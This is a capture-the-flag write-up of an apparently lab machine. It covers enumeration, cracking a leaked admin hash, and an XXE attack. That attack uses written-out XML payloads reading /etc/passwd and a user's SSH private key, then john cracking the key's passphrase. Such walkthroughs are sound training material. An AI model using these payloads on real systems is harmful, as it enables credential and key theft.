Starting with an Nmap scan;

![mustanmap](https://user-images.githubusercontent.com/64267672/127815548-b5f10bb9-84b5-46a2-b2a7-27f2d002834e.png)

so we visit the webpage on port 80

![musta80](https://user-images.githubusercontent.com/64267672/127815786-1ae4cd89-c131-4788-b0fb-c7cd92c9f3b0.png)

But we find nothing interesting so we bruteforce for directories;

![mustffuf](https://user-images.githubusercontent.com/64267672/127816784-ada8ed34-9668-4349-b722-bf8b32da08ad.png)

Upon visiting /custom directory we find a js folder & inside we find an interesting Users.bak file

![mustacustom](https://user-images.githubusercontent.com/64267672/127946906-222dd700-0b3c-45b4-b16c-0aba702af3f5.png)

Downloading the file & upon inspecting, we find out it contains a user "Admin" & a password hash (cropped here)

![mustapassha](https://user-images.githubusercontent.com/64267672/127947702-ac1df379-536d-4a52-9661-594ab35cfed0.png)


we can crack this hash on crackstation.net to get the plaintext password

Now we can try to ssh with known creds now but it doesn't work so Looking back at our Nmap scan we see there's another web server hosted on port 8765

![must8765](https://user-images.githubusercontent.com/64267672/127948309-5ea4b555-910c-4573-a0e9-d6172839c8c8.png)


Now trying the creds here again and we get logged in 


![mustalogged](https://user-images.githubusercontent.com/64267672/127948561-7c3ee270-8ed9-464c-8757-f27692f9aff5.png)


I tried sending a random text at first like "hello" and noticed a few things;

(1) It has a parameter called xml
(2) a url in comment Example=/auth/dontforget.bak
(2) Also in the html comment i see the user has an ssh key i'm suppose to get somehow 

so i have to test for xxe here apparently

![mustburp](https://user-images.githubusercontent.com/64267672/127949306-0398f4ea-e328-44ac-b85f-3664730e461f.png)

on the webpage we see we can make a valid xml request with the name, author & comment parameter and so we have to provide that

so sending a GET request to the url from the html comment we find an example we can use going forward

And with this now we can read the /etc/passwd file and also grab the ssh keys from this machine

```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>```

![mustetc](https://user-images.githubusercontent.com/64267672/127950858-dd980ac2-3048-4163-9b7c-934bcc021e04.png)

and now the ssh key 

```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&name;</name>
  <author>Barry Clad</author>
  <com>comments</com>
</comment>```

![mustssh](https://user-images.githubusercontent.com/64267672/127951064-94dcfe73-ce2c-4bd0-84bb-d95fae2bf4c0.png)

now we can save the file locally and try to ssh but we find out the key password protected

For this we can use the ssh2john tool to convert the key to hash & then crack hash with john

```┌──(Nerdy㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
ur****es       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:16 DONE (2021-08-03 03:09) 0.05885g/s 844125p/s 844125c/s 844125C/sa6_123..*7¡Vamos!
Session completed```

After changing the perms for the key Now we can ssh into the Barry machine successfully using the key & password;




